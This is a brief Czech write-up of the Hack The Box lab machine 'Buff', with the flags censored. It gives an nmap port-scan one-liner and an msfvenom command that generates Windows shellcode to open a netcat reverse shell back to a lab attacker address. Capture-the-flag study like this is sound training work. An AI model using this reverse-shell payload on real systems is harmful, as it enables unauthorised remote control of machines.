[Buff](https://www.hackthebox.eu/home/machines/profile/263) je stroj z Hack The Box. Klíčová část útoku je webová enumerace a praktické zneužití nalezené slabiny.

### Vyhledání otevřených portů
Nejdřív mapuji služby, které jsou dostupné zvenku.
`ports=$(nmap -p- --min-rate=1000 -T4 -Pn $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v -Pn $IP`

### Získání user flagu
Tímto potvrzuji úspěšný uživatelský přístup.
`powershell "cat user.txt"`
```
__CENSORED__
```

### Spuštění exploitu
Zde dochází k praktickému zneužití zranitelnosti.
`msfvenom -a x86 -p windows/exec CMD='c:\programdata\nc.exe 10.10.14.9 4002 -e cmd' -b '\x00\x0A\x0D' -f python`

### Získání root flagu
Tímto potvrzuji úplné ovládnutí stroje.
`type root.txt`
```
__CENSORED__
```
